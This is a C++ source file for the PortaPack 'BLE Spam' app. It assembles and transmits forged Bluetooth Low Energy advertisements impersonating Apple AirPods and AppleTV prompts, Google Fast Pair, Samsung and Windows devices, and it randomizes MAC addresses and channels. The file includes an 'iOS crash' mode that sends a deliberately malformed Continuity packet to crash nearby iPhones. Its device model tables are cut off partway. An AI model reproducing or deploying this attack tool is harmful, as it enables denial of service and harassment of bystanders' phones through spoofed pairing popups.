/*
 * Copyright (C) 2014 Jared Boone, ShareBrained Technology, Inc.
 * Copyright (C) 2017 Furrtek
 *
 * This file is part of PortaPack.
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2, or (at your option)
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; see the file COPYING.  If not, write to
 * the Free Software Foundation, Inc., 51 Franklin Street,
 * Boston, MA 02110-1301, USA.
 */

// Code from https://github.com/Next-Flip/Momentum-Apps/blob/dev/ble_spam/
// Thanks for the work of the original creators!

#include "ui_blespam.hpp"
#include "ui_modemsetup.hpp"

#include "modems.hpp"
#include "audio.hpp"
#include "rtc_time.hpp"
#include "baseband_api.hpp"
#include "string_format.hpp"
#include "portapack_persistent_memory.hpp"

using namespace portapack;
using namespace modems;
using namespace ui;

#ifndef COUNT_OF
#define COUNT_OF(x) (sizeof(x) / sizeof(x[0]))
#endif

namespace ui::external_app::blespam {

void BLESpamView::focus() {
    button_startstop.focus();
}

uint64_t BLESpamView::get_freq_by_channel_number(uint8_t channel_number) {
    uint64_t freq_hz;

    switch (channel_number) {
        case 37:
            freq_hz = 2'402'000'000ull;
            break;
        case 38:
            freq_hz = 2'426'000'000ull;
            break;
        case 39:
            freq_hz = 2'480'000'000ull;
            break;
        case 0 ... 10:
            freq_hz = 2'404'000'000ull + channel_number * 2'000'000ull;
            break;
        case 11 ... 36:
            freq_hz = 2'428'000'000ull + (channel_number - 11) * 2'000'000ull;
            break;
        default:
            freq_hz = UINT64_MAX;
    }

    return freq_hz;
}
BLESpamView::BLESpamView(NavigationView& nav)
    : nav_{nav} {
    add_children({&button_startstop,
                  &field_frequency,
                  &tx_view,
                  &chk_randdev,
                  &options_atkmode
#ifdef BLESPMUSECONSOLE
                  ,
                  &console
#endif
    });

    button_startstop.on_select = [this](Button&) {
        if (is_running) {
            is_running = false;
            stop();
            button_startstop.set_text(LanguageHelper::currentMessages[LANG_START]);
        } else {
            is_running = true;
            start();
            button_startstop.set_text(LanguageHelper::currentMessages[LANG_STOP]);
        }
    };
    chk_randdev.set_value(true);
    field_frequency.set_value(get_freq_by_channel_number(channel_number));
    chk_randdev.on_select = [this](Checkbox&, bool v) {
        randomDev = v;
    };
    options_atkmode.on_change = [this](size_t, int32_t i) {
        attackType = (ATK_TYPE)i;
        changePacket(true);
    };
#ifdef BLESPMUSECONSOLE
    console.writeln("Based on work of:");
    console.writeln("@Willy-JL, @ECTO-1A,");
    console.writeln("@Spooks4576, @iNetro");
    console.writeln("---");
    console.writeln("iOS crash + Android\nattacks are patched\non new devices.");
#endif
    changePacket(true);  // init
}

void BLESpamView::stop() {
    transmitter_model.disable();
    baseband::shutdown();
}

void BLESpamView::start() {
    baseband::run_image(portapack::spi_flash::image_tag_btle_tx);
    transmitter_model.enable();

    baseband::set_btletx(channel_number, mac, advertisementData, pduType);
}
void BLESpamView::reset() {
    stop();
    start();
}

void BLESpamView::randomChn() {
    channel_number = 37 + std::rand() % (39 - 37 + 1);
    field_frequency.set_value(get_freq_by_channel_number(channel_number));
}

void BLESpamView::randomizeMac() {
    if (!randomMac) return;
    const char hexDigits[] = "0123456789ABCDEF";
    // Generate 12 random hexadecimal characters
    for (int i = 0; i < 12; ++i) {
        int randomIndex = rand() % 16;
        mac[i] = hexDigits[randomIndex];
    }
    mac[12] = '\0';  // Null-terminate the string
}

void BLESpamView::on_tx_progress(const bool done) {
    if (done) {
        if (is_running) {
            changePacket(false);
            baseband::set_btletx(channel_number, mac, advertisementData, pduType);
        }
    }
}

void BLESpamView::furi_hal_random_fill_buf(uint8_t* buf, uint32_t len) {
    for (uint32_t i = 0; i < len; i += 4) {
        const uint32_t random_val = rand();
        uint8_t len_cur = ((i + 4) < len) ? (4) : (len - i);
        memcpy(&buf[i], &random_val, len_cur);
    }
}

void BLESpamView::createSamsungPacket() {
    uint8_t packet_SamsungSizes[] = {0, 31, 15};
    EasysetupType type;
    const EasysetupType types[] = {
        EasysetupTypeBuds,
        EasysetupTypeWatch,
    };
    type = types[rand() % COUNT_OF(types)];

    uint8_t size = packet_SamsungSizes[type];
    uint8_t i = 0;

    switch (type) {
        case EasysetupTypeBuds: {
            uint32_t model;
            switch (PayloadModeRandom) {
                case PayloadModeRandom:
                default:
                    model = buds_models[rand() % buds_models_count].value;
                    break;
                    /*case PayloadModeValue:
                        model = cfg->data.buds.model;
                        break;*/
            }

            packet[i++] = 27;    // Size
            packet[i++] = 0xFF;  // AD Type (Manufacturer Specific)
            packet[i++] = 0x75;  // Company ID (Samsung Electronics Co. Ltd.)
            packet[i++] = 0x00;  // ...
            packet[i++] = 0x42;
            packet[i++] = 0x09;
            packet[i++] = 0x81;
            packet[i++] = 0x02;
            packet[i++] = 0x14;
            packet[i++] = 0x15;
            packet[i++] = 0x03;
            packet[i++] = 0x21;
            packet[i++] = 0x01;
            packet[i++] = 0x09;
            packet[i++] = (model >> 0x10) & 0xFF;  // Buds Model / Color (?)
            packet[i++] = (model >> 0x08) & 0xFF;  // ...
            packet[i++] = 0x01;                    // ... (Always static?)
            packet[i++] = (model >> 0x00) & 0xFF;  // ...
            packet[i++] = 0x06;
            packet[i++] = 0x3C;
            packet[i++] = 0x94;
            packet[i++] = 0x8E;
            packet[i++] = 0x00;
            packet[i++] = 0x00;
            packet[i++] = 0x00;
            packet[i++] = 0x00;
            packet[i++] = 0xC7;
            packet[i++] = 0x00;

            packet[i++] = 16;    // Size
            packet[i++] = 0xFF;  // AD Type (Manufacturer Specific)
            packet[i++] = 0x75;  // Company ID (Samsung Electronics Co. Ltd.)
            // Truncated AD segment, Android seems to fill in the rest with zeros
            break;
        }
        case EasysetupTypeWatch: {
            uint8_t model;
            switch (PayloadModeRandom) {
                case PayloadModeRandom:
                default:
                    model = watch_models[rand() % watch_models_count].value;
                    break;
                    /*case PayloadModeValue:
                        model = cfg->data.watch.model;
                        break;*/
            }

            packet[i++] = 14;    // Size
            packet[i++] = 0xFF;  // AD Type (Manufacturer Specific)
            packet[i++] = 0x75;  // Company ID (Samsung Electronics Co. Ltd.)
            packet[i++] = 0x00;  // ...
            packet[i++] = 0x01;
            packet[i++] = 0x00;
            packet[i++] = 0x02;
            packet[i++] = 0x00;
            packet[i++] = 0x01;
            packet[i++] = 0x01;
            packet[i++] = 0xFF;
            packet[i++] = 0x00;
            packet[i++] = 0x00;
            packet[i++] = 0x43;
            packet[i++] = (model >> 0x00) & 0xFF;  // Watch Model / Color (?)
            break;
        }
        default:
            break;
    }
    // size, packet
    std::string res = to_string_hex_array(packet, size);
    memset(advertisementData, 0, sizeof(advertisementData));
    std::copy(res.begin(), res.end(), advertisementData);
}

void BLESpamView::createWindowsPacket() {
    /*  const char* names[] = {
          "PortaPack",
          "HackRf",
          "iOS 21 🍎",
          "WorkMate",
          "👉👌",
          "🔵🦷",
      }; //not worky using fix, for testing.
      */
    const char* name = "PortaHack";
    // name = names[rand() % 6];
    uint8_t name_len = strlen(name);

    uint8_t size = 7 + name_len;
    uint8_t i = 0;

    packet[i++] = size - 1;              // Size
    packet[i++] = 0xFF;                  // AD Type (Manufacturer Specific)
    packet[i++] = 0x06;                  // Company ID (Microsoft)
    packet[i++] = 0x00;                  // ...
    packet[i++] = 0x03;                  // Microsoft Beacon ID
    packet[i++] = 0x00;                  // Microsoft Beacon Sub Scenario
    packet[i++] = 0x80;                  // Reserved RSSI Byte
    memcpy(&packet[i], name, name_len);  // Device Name
    i += name_len;
    // size, packet
    std::string res = to_string_hex_array(packet, size);
    memset(advertisementData, 0, sizeof(advertisementData));
    std::copy(res.begin(), res.end(), advertisementData);
}

void BLESpamView::createNameSpamPacket() {
    const char* names[] = {"PortaHack", "PwnBt", "iSpam", "GenericFoodVagon", "SignalSnoop", "ByteBandit", "RadioRogue", "RadioRebel", "ByteBlast"};

    const char* name = names[rand() % 9];  //"PortaHack";
    uint8_t name_len = strlen(name);

    uint8_t size = 12 + name_len;
    uint8_t i = 0;

    packet[i++] = 2;     // Size
    packet[i++] = 0x01;  // AD Type (Flags)
    packet[i++] = 0x06;  // Flags

    packet[i++] = name_len + 1;          // Size
    packet[i++] = 0x09;                  // AD Type (Complete Local Name)
    memcpy(&packet[i], name, name_len);  // Device Name
    i += name_len;

    packet[i++] = 3;     // Size
    packet[i++] = 0x02;  // AD Type (Incomplete Service UUID List)
    packet[i++] = 0x12;  // Service UUID (Human Interface Device)
    packet[i++] = 0x18;  // ...

    packet[i++] = 2;     // Size
    packet[i++] = 0x0A;  // AD Type (Tx Power Level)
    packet[i++] = 0x00;  // 0dBm

    // size, packet
    std::string res = to_string_hex_array(packet, size);
    memset(advertisementData, 0, sizeof(advertisementData));
    std::copy(res.begin(), res.end(), advertisementData);
}

char BLESpamView::randomNameChar() {
    int randVal = rand() % 62;  // 26 uppercase + 26 lowercase + 10 digits
    if (randVal < 26) {
        return 'A' + randVal;  // Uppercase letters
    } else if (randVal < 52) {
        return 'a' + (randVal - 26);  // Lowercase letters
    } else {
        return '0' + (randVal - 52);  // Digits
    }
}

void BLESpamView::createNameRandomPacket() {
    char name[] = "         ";

    uint8_t name_len = strlen(name);
    for (uint8_t i = 0; i < name_len; ++i) {
        name[i] = randomNameChar();
    }

    uint8_t size = 12 + name_len;
    uint8_t i = 0;

    packet[i++] = 2;     // Size
    packet[i++] = 0x01;  // AD Type (Flags)
    packet[i++] = 0x06;  // Flags

    packet[i++] = name_len + 1;          // Size
    packet[i++] = 0x09;                  // AD Type (Complete Local Name)
    memcpy(&packet[i], name, name_len);  // Device Name
    i += name_len;

    packet[i++] = 3;     // Size
    packet[i++] = 0x02;  // AD Type (Incomplete Service UUID List)
    packet[i++] = 0x12;  // Service UUID (Human Interface Device)
    packet[i++] = 0x18;  // ...

    packet[i++] = 2;     // Size
    packet[i++] = 0x0A;  // AD Type (Tx Power Level)
    packet[i++] = 0x00;  // 0dBm

    // size, packet
    std::string res = to_string_hex_array(packet, size);
    memset(advertisementData, 0, sizeof(advertisementData));
    std::copy(res.begin(), res.end(), advertisementData);
}

void BLESpamView::createIosPacket(bool crash = false) {
    uint8_t ios_packet_sizes[18] = {0, 0, 0, 0, 0, 24, 0, 31, 0, 12, 0, 0, 20, 0, 12, 11, 11, 17};
    ContinuityType type;
    const ContinuityType types[] = {
        ContinuityTypeProximityPair,
        ContinuityTypeNearbyAction,
    };
    type = types[rand() % 2];
    if (crash) type = ContinuityTypeCustomCrash;

    uint8_t size = ios_packet_sizes[type];
    uint8_t i = 0;

    packet[i++] = size - 1;    // Size
    packet[i++] = 0xFF;        // AD Type (Manufacturer Specific)
    packet[i++] = 0x4C;        // Company ID (Apple, Inc.)
    packet[i++] = 0x00;        // ...
    packet[i++] = type;        // Continuity Type
    packet[i] = size - i - 1;  // Continuity Size
    i++;

    switch (type) {
        case ContinuityTypeAirDrop: {
            packet[i++] = 0x00;            // Zeros
            packet[i++] = 0x00;            // ...
            packet[i++] = 0x00;            // ...
            packet[i++] = 0x00;            // ...
            packet[i++] = 0x00;            // ...
            packet[i++] = 0x00;            // ...
            packet[i++] = 0x00;            // ...
            packet[i++] = 0x00;            // ...
            packet[i++] = 0x01;            // Version
            packet[i++] = (rand() % 256);  // AppleID
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // Phone Number
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // Email
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // Email2
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = 0x00;            // Zero
            break;
        }

        case ContinuityTypeProximityPair: {
            uint16_t model;
            uint8_t color;
            switch (PayloadModeRandom) {
                case PayloadModeRandom:
                default: {
                    uint8_t model_index = rand() % pp_models_count;
                    uint8_t color_index = rand() % pp_models[model_index].colors_count;
                    model = pp_models[model_index].value;
                    color = pp_models[model_index].colors[color_index].value;
                    break;
                }
                    /* case PayloadModeValue:
                         model = cfg->data.proximity_pair.model;
                         color = cfg->data.proximity_pair.color;
                         break;*/
            }

            uint8_t prefix;
            if (model == 0x0055 || model == 0x0030)
                prefix = 0x05;
            else
                prefix = 0x01;

            packet[i++] = prefix;                                // Prefix (paired 0x01 new 0x07 airtag 0x05)
            packet[i++] = (model >> 0x08) & 0xFF;                // Device Model
            packet[i++] = (model >> 0x00) & 0xFF;                // ...
            packet[i++] = 0x55;                                  // Status
            packet[i++] = ((rand() % 10) << 4) + (rand() % 10);  // Buds Battery Level
            packet[i++] = ((rand() % 8) << 4) + (rand() % 10);   // Charing Status and Battery Case Level
            packet[i++] = (rand() % 256);                        // Lid Open Counter
            packet[i++] = color;                                 // Device Color
            packet[i++] = 0x00;
            furi_hal_random_fill_buf(&packet[i], 16);  // Encrypted Payload
            i += 16;
            break;
        }

        case ContinuityTypeAirplayTarget: {
            packet[i++] = (rand() % 256);  // Flags
            packet[i++] = (rand() % 256);  // Configuration Seed
            packet[i++] = (rand() % 256);  // IPv4 Address
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // ...
            break;
        }

        case ContinuityTypeHandoff: {
            packet[i++] = 0x01;            // Version
            packet[i++] = (rand() % 256);  // Initialization Vector
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // AES-GCM Auth Tag
            packet[i++] = (rand() % 256);  // Encrypted Payload
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // ...
            break;
        }

        case ContinuityTypeTetheringSource: {
            packet[i++] = 0x01;            // Version
            packet[i++] = (rand() % 256);  // Flags
            packet[i++] = (rand() % 101);  // Battery Life
            packet[i++] = 0x00;            // Cell Service Type
            packet[i++] = (rand() % 8);    // ...
            packet[i++] = (rand() % 5);    // Cell Service Strength
            break;
        }

        case ContinuityTypeNearbyAction: {
            uint8_t action;
            switch (PayloadModeRandom) {
                case PayloadModeRandom:
                default:
                    action = na_actions[rand() % na_actions_count].value;
                    break;
                    /* case PayloadModeValue:
                         action = cfg->data.nearby_action.action;
                         break;*/
            }

            uint8_t flags;

            flags = 0xC0;
            if (action == 0x20 && rand() % 2) flags--;       // More spam for 'Join This AppleTV?'
            if (action == 0x09 && rand() % 2) flags = 0x40;  // Glitched 'Setup New Device'

            packet[i++] = flags;                      // Action Flags
            packet[i++] = action;                     // Action Type
            furi_hal_random_fill_buf(&packet[i], 3);  // Authentication Tag
            i += 3;
            break;
        }

        case ContinuityTypeNearbyInfo: {
            packet[i++] = ((rand() % 16) << 4) + (rand() % 16);  // Status Flags and Action Code
            packet[i++] = (rand() % 256);                        // Status Flags
            packet[i++] = (rand() % 256);                        // Authentication Tag
            packet[i++] = (rand() % 256);                        // ...
            packet[i++] = (rand() % 256);                        // ...
            break;
        }

        case ContinuityTypeCustomCrash: {
            // Found by @ECTO-1A

            uint8_t action = na_actions[rand() % na_actions_count].value;
            uint8_t flags = 0xC0;
            if (action == 0x20 && rand() % 2) flags--;       // More spam for 'Join This AppleTV?'
            if (action == 0x09 && rand() % 2) flags = 0x40;  // Glitched 'Setup New Device'

            i -= 2;                                    // Override segment header
            packet[i++] = ContinuityTypeNearbyAction;  // Continuity Type
            packet[i++] = 5;                           // Continuity Size
            packet[i++] = flags;                       // Action Flags
            packet[i++] = action;                      // Action Type
            furi_hal_random_fill_buf(&packet[i], 3);   // Authentication Tag
            i += 3;

            packet[i++] = 0x00;  // Additional Action Data Terminator (?)
            packet[i++] = 0x00;  // ...

            packet[i++] = ContinuityTypeNearbyInfo;   // Continuity Type (?)
            furi_hal_random_fill_buf(&packet[i], 3);  // Continuity Size (?) + Shenanigans (???)
            i += 3;
            break;
        }

        default:
            break;
    }
    // size, packet
    std::string res = to_string_hex_array(packet, size);
    memset(advertisementData, 0, sizeof(advertisementData));
    std::copy(res.begin(), res.end(), advertisementData);
}

void BLESpamView::createFastPairPacket() {
    uint32_t model = fastpairModels[rand() % fastpairModels_count].value;
    uint8_t size = 14;
    uint8_t i = 0;

    packet[i++] = 3;     // Size
    packet[i++] = 0x03;  // AD Type (Service UUID List)
    packet[i++] = 0x2C;  // Service UUID (Google LLC, FastPair)
    packet[i++] = 0xFE;  // ...

    packet[i++] = 6;                       // Size
    packet[i++] = 0x16;                    // AD Type (Service Data)
    packet[i++] = 0x2C;                    // Service UUID (Google LLC, FastPair)
    packet[i++] = 0xFE;                    // ...
    packet[i++] = (model >> 0x10) & 0xFF;  // Device Model
    packet[i++] = (model >> 0x08) & 0xFF;  // ...
    packet[i++] = (model >> 0x00) & 0xFF;  // ...

    packet[i++] = 2;                     // Size
    packet[i++] = 0x0A;                  // AD Type (Tx Power Level)
    packet[i++] = (rand() % 120) - 100;  // -100 to +20 dBm

    // size, packet
    std::string res = to_string_hex_array(packet, size);
    memset(advertisementData, 0, sizeof(advertisementData));
    std::copy(res.begin(), res.end(), advertisementData);
}

void BLESpamView::createAnyPacket(bool safe) {
    ATK_TYPE type[] = {
        ATK_ANDROID,
        ATK_IOS,
        ATK_WINDOWS,
        ATK_SAMSUNG,
        ATK_NAMESPAM,
        ATK_NAMERANDOM,
        ATK_IOS_CRASH};
    ATK_TYPE attackType = type[rand() % (COUNT_OF(type) - (1 ? safe : 0))];
    createPacket(attackType);
}

void BLESpamView::createPacket(ATK_TYPE attackType) {
    switch (attackType) {
        case ATK_IOS_CRASH:
            createIosPacket(true);
            break;
        case ATK_IOS:
            createIosPacket(false);
            break;
        case ATK_SAMSUNG:
            createSamsungPacket();
            break;
        case ATK_WINDOWS:
            createWindowsPacket();
            break;
        case ATK_NAMESPAM:
            createNameSpamPacket();
            break;
        case ATK_NAMERANDOM:
            createNameRandomPacket();
            break;
        case ATK_ALL_SAFE:
            createAnyPacket(true);
            break;
        case ATK_ALL:
            createAnyPacket(false);
            break;
        default:
        case ATK_ANDROID:
            createFastPairPacket();
            break;
    }
}

void BLESpamView::changePacket(bool forced = false) {
    counter++;  // need to send it multiple times to be accepted
    if (counter >= 4 || forced) {
        // really change packet and mac.
        counter = 0;
        randomizeMac();
        randomChn();
        if (randomDev || forced) {
            createPacket(attackType);
        }
// rate limit console display
#ifdef BLESPMUSECONSOLE
        displayCounter++;
        if (displayCounter > 25) {
            displayCounter = 0;
            console.writeln(advertisementData);
        }
#endif
    }
}

BLESpamView::~BLESpamView() {
    is_running = false;
    stop();
}

const BLESpamView::ContinuityColor BLESpamView::colors_white[] = {
    {0x00},  //, "White"
};
const BLESpamView::ContinuityColor BLESpamView::colors_airpods_max[] = {
    {0x00},  //, "White"
    {0x02},  //, "Red"
    {0x03},  //, "Blue"
    {0x0F},  //, "Black"
    {0x11},  //, "Light Green"
};
const BLESpamView::ContinuityColor BLESpamView::colors_beats_flex[] = {
    {0x00},  //, "White"
    {0x01},  //, "Black"
};
const BLESpamView::ContinuityColor BLESpamView::colors_beats_solo_3[] = {
    {0x00},  //, "White"
    {0x01},  //, "Black"
    {0x6},   //, "Gray"
    {0x7},   //, "Gold/White"
    {0x8},   //, "Rose Gold"
    {0x09},  //, "Black"
    {0xE},   //, "Violet/White"
    {0xF},   //, "Bright Red"
    {0x12},  //, "Dark Red"
    {0x13},  //, "Swamp Green"
    {0x14},  //, "Dark Gray"
    {0x15},  //, "Dark Blue"
    {0x1D},  //, "Rose Gold 2"
    {0x20},  //, "Blue/Green"
    {0x21},  //, "Purple/Orange"
    {0x22},  //, "Deep Blue/ Light blue"
    {0x23},  //, "Magenta/Light Fuchsia"
    {0x25},  //, "Black/Red"
    {0x2A},  //, "Gray / Disney LTD"
    {0x2E},  //, "Pinkish white"
    {0x3D},  //, "Red/Blue"
    {0x3E},  //, "Yellow/Blue"
    {0x3F},  //, "White/Red"
    {0x40},  //, "Purple/White"
    {0x5B},  //, "Gold"
    {0x5C},  //, "Silver"
};
const BLESpamView::ContinuityColor BLESpamView::colors_powerbeats_3[] = {
    {0x00},  //, "White"
    {0x01},  //, "Black"
    {0x0B},  //, "Gray/Blue"
    {0x0C},  //, "Gray/Red"
    {0x0D},  //, "Gray/Green"
    {0x12},  //, "Red"
    {0x13},  //, "Swamp Green"
    {0x14},  //, "Gray"
    {0x15},  //, "Deep Blue"
    {0x17},  //, "Dark with Gold Logo"
};
const BLESpamView::ContinuityColor BLESpamView::colors_powerbeats_pro[] = {
    {0x00},  //, "White"
    {0x02},  //, "Yellowish Green"
    {0x03},  //, "Blue"
    {0x04},  //, "Black"
    {0x05},  //, "Pink"
    {0x06},  //, "Red"
    {0x0B},  //, "Gray ?"
    {0x0D},  //, " Sky Blue
};
const BLESpamView::ContinuityColor BLESpamView::colors_beats_solo_pro[] = {
    {0x00},  //, "White"
    {0x01},  //, "Black"
};
const BLESpamView::ContinuityColor BLESpamView::colors_beats_studio_buds[] = {
    {0x00},  //, "White"
    {0x0},   // 1, "Black"
    {0x02},  //, "Red"
    {0x03},  //, "Blue"
    {0x04},  //, "Pink"
    {0x06},  //, "Silver"
};
const BLESpamView::ContinuityColor BLESpamView::colors_beats_x[] = {
    {0x00},  //, "White"
    {0x01},  //, "Black"
    {0x02},  //, "Blue"
    {0x05},  //, "Gray"
    {0x1D},  //, "Pink"
    {0x25},  //, "Dark/Red"
};
const BLESpamView::ContinuityColor BLESpamView::colors_beats_studio_3[] = {
    {0x00},  //, "White"
    {0x01},  //, "Black"
    {0x02},  //, "Red"
    {0x03},  //, "Blue"
    {0x18},  //, "Shadow Gray"
    {0x19},  //, "Desert Sand"
    {0x25},  //, "Black / Red"
    {0x26},  //, "Midnight Black"
    {0x27},  //, "Desert Sand 2"
    {0x28},  //, "Gray"
    {0x29},  //, "Clear blue/ gold"
    {0x42},  //, "Green Forest camo"
    {0x43},  //, "White Camo"
};
const BLESpamView::ContinuityColor BLESpamView::colors_beats_studio_pro[] = {
    {0x00},  //, "White"
    {0x01},  //, "Black"
};
const BLESpamView::ContinuityColor BLESpamView::colors_beats_fit_pro[] = {
    {0x00},  //, "White"
    {0x01},  //, "Black"
    {0x02},  //, "Pink"
    {0x03},  //, "Grey/White"
    {0x04},  //, "Full Pink"
    {0x05},  //, "Neon Green"
    {0x06},  //, "Night Blue"
    {0x07},  //, "Light Pink"
    {0x08},  //, "Brown"
    {0x09},  //, "Dark Brown"
};
const BLESpamView::ContinuityColor BLESpamView::colors_beats_studio_buds_[] = {
    {0x00},  //, "Black"
    {0x01},  //, "White"
    {0x02},  //, "Transparent"
    {0x03},  //, "Silver"
    {0x04},  //, "Pink"
};

const BLESpamView::contiModels BLESpamView::pp_models[] = {
    {0x0E20, colors_white, COUNT_OF(colors_white)},                            //"AirPods Pro",
    {0x0A20, colors_airpods_max, COUNT_OF(colors_airpods_max)},                //"AirPods Max",
    {0x0055, colors_white, COUNT_OF(colors_white)},                            //"Airtag",
    {0x0030, colors_white, COUNT_OF(colors_white)},                            //"Hermes Airtag",
    {0x0220, colors_white, COUNT_OF(colors_white)},                            //"AirPods",
    {0x0F20, colors_white, COUNT_OF(colors_white)},                            //"AirPods 2nd Gen",
    {0x1320, colors_white, COUNT_OF(colors_white)},                            //"AirPods 3rd Gen",
    {0x1420, colors_white, COUNT_OF(colors_white)},                            //"AirPods Pro 2nd Gen",
    {0x1020, colors_beats_flex, COUNT_OF(colors_beats_flex)},                  // "Beats Flex",
    {0x0620, colors_beats_solo_3, COUNT_OF(colors_beats_solo_3)},              // "Beats Solo 3",
    {0x0320, colors_powerbeats_3, COUNT_OF(colors_powerbeats_3)},              //"Powerbeats 3",
    {0x0B20, colors_powerbeats_pro, COUNT_OF(colors_powerbeats_pro)},          //"Powerbeats Pro",
    {0x0C20, colors_beats_solo_pro, COUNT_OF(colors_beats_solo_pro)},          //"Beats Solo Pro",
    {0x1120, colors_beats_studio_buds, COUNT_OF(colors_beats_studio_buds)},    //"Beats Studio Buds",
    {0x0520, colors_beats_x, COUNT_OF(colors_beats_x)},                        //"Beats X",
    {0x0920, colors_beats_studio_3, COUNT_OF(colors_beats_studio_3)},          //"Beats Studio 3",
    {0x1720, colors_beats_studio_pro, COUNT_OF(colors_beats_studio_pro)},      //"Beats Studio Pro",
    {0x1220, colors_beats_fit_pro, COUNT_OF(colors_beats_fit_pro)},            //"Beats Fit Pro",
    {0x1620, colors_beats_studio_buds_, COUNT_OF(colors_beats_studio_buds_)},  //"Beats Studio Buds+",
};
const uint8_t BLESpamView::pp_models_count = COUNT_OF(pp_models);

const BLESpamView::contiU8 BLESpamView::pp_prefixes[] = {
    {0x07},  //, "New Device"
    {0x01},  //, "Not Your Device"
    {0x05},  //, "New Airtag"
};

const uint8_t BLESpamView::pp_prefixes_count = COUNT_OF(pp_prefixes);

const BLESpamView::contiU8 BLESpamView::na_actions[] = {
    {0x13},  //, "AppleTV AutoFill"
    {0x27},  //, "AppleTV Connecting..."
    {0x20},  //, "Join This AppleTV?"
    {0x19},  //, "AppleTV Audio Sync"
    {0x1E},  //, "AppleTV Color Balance"
    {0x09},  //, "Setup New iPhone"
    {0x02},  //, "Transfer Phone Number"
    {0x0B},  //, "HomePod Setup"
    {0x01},  //, "Setup New AppleTV"
    {0x06},  //, "Pair AppleTV"
    {0x0D},  //, "HomeKit AppleTV Setup"
    {0x2B},  //, "AppleID for AppleTV?"
};

const uint8_t BLESpamView::na_actions_count = COUNT_OF(na_actions);

// fastpair

const BLESpamView::fpUi32 BLESpamView::fastpairModels[] = {
    // Genuine non-production/forgotten (good job Google)
    {0x0001F0},
    {0x000047},
    {0x470000},
    {0x00000A},
    {0x0A0000},
    {0x00000B},
    {0x0B0000},
    {0x0C0000},
    {0x00000D},
    {0x000007},
    {0x070000},
    {0x000008},
    {0x080000},
    {0x000009},
    {0x090000},
    {0x000035},
    {0x350000},
    {0x000048},
    {0x480000},
    {0x000049},
    {0x490000},
    {0x001000},
    {0x00B727},
    {0x01E5CE},
    {0x0200F0},
    {0x00F7D4},
    {0xF00002},
    {0xF00400},
    {0x1E89A7},

    {0x00000C},
    {0x0577B1},
    {0x05A9BC},

    {0xCD8256},
    {0x0000F0},
    {0xF00000},
    {0x821F66},
    {0xF52494},
    {0x718FA4},
    {0x0002F0},
    {0x92BBBD},
    {0x000006},
    {0x060000},
    {0xD446A7},
    {0x2D7A23},
    {0x0E30C3},
    {0x72EF8D},
    {0x72FB00},
    {0x0003F0},
    {0x002000},
    {0x003000},
    {0x003001},
    {0x00A168},
    {0x00AA48},
    {0x00AA91},
    {0x00C95C},
    {0x01EEB4},
    {0x02AA91},
    {0x01C95C},
    {0x02D815},
    {0x035764},
    {0x038CC7},
    {0x02DD4F},
    {0x02E2A9},
    {0x035754},
    {0x02C95C},
    {0x038B91},
    {0x02F637},
    {0x02D886},
    {0xF00000},
    {0xF00001},
    {0xF00201},
    {0xF00204},
    {0xF00209},
    {0xF00205},
    {0xF00200},
    {0xF00208},
    {0xF00207},
    {0xF00206},
    {0xF0020A},
    {0xF0020B},
    {0xF0020C},
    {0xF00203},
    {0xF00202},
    {0xF00213},
    {0xF0020F},
    {0xF0020E},
    {0xF00214},
    {0xF00212},
    {0xF0020D},
    {0xF00211},
    {0xF00215},
    {0xF00210},
    {0xF00305},
    {0xF00304},
    {0xF00308},
    {0xF00303},
    {0xF00306},
    {0xF00300},
    {0xF00309},
    {0xF00302},
    {0xF00307},
    {0xF00301},
    {0xF00E97},
    {0x04ACFC},
    {0x04AA91},
    {0x04AFB8},
    {0x05A963},
    {0x05AA91},
    {0x05C452},
    {0x05C95C},
    {0x0602F0},
    {0x0603F0},
    {0x1E8B18},
    {0x1E955B},
    {0x1EC95C},
    {0x1ED9F9},
    {0x1EE890},
    {0x1EEDF5},
    {0x1F1101},
    {0x1F181A},
    {0x1F2E13},
    {0x1F4589},
    {0x1F4627},
    {0x1F5865},
    {0x1FBB50},
    {0x1FC95C},
    {0x1FE765},
    {0x1FF8FA},
    {0x201C7C},
    {0x202B3D},
    {0x20330C},
    {0x003B41},
    {0x003D8A},
    {0x005BC3},
    {0x008F7D},
    {0x00FA72},
    {0x0100F0},
    {0x011242},
    {0x013D8A},
    {0x01AA91},
    {0x038F16},
    {0x039F8F},
    {0x03AA91},
    {0x03B716},
    {0x03C95C},
    {0x03C99C},
    {0x03F5D4},
    {0x045754},
    {0x045764},
    {0x04C95C},
    {0x050F0C},
    {0x052CC7},
    {0x057802},
    {0x0582FD},
    {0x058D08},
    {0x06AE20},
    {0x06C197},
    {0x06C95C},
    {0x06D8FC},
    {0x0744B6},
    {0x07A41C},
    {0x07C95C},
    {0x07F426},
    {0x0102F0},
    {0x0202F0},
    {0x0302F0},
    {0x0402F0},
    {0x0502F0},
    {0x0702F0},
    {0x0802F0},
    {0x054B2D},
    {0x0660D7},
    {0x0103F0},
    {0x0203F0},
    {0x0303F0},
    {0x0403F0},
    {0x0503F0},
    {0x0703F0},
    {0x0803F0},
    {0x0903F0},
    {0x0102F0},
    {0x0202F0},
    {0x0302F0},
    {0x0402F0},
    {0x0502F0},
    {0x060000},
    {0x070000},
    {0x0702F0},
    {0x071C74},
    {0x080000},
    {0x0802F0},
    {0x090000},
    {0x0A0000},
    {0x0B0000},
    {0x0C0000},
    {0x0DC6BF},
    {0x0DC95C},
    {0x0DEC2B},
    {0x0E138D},
    {0x0EC95C},
    {0x0ECE95},
    {0x0F0993},
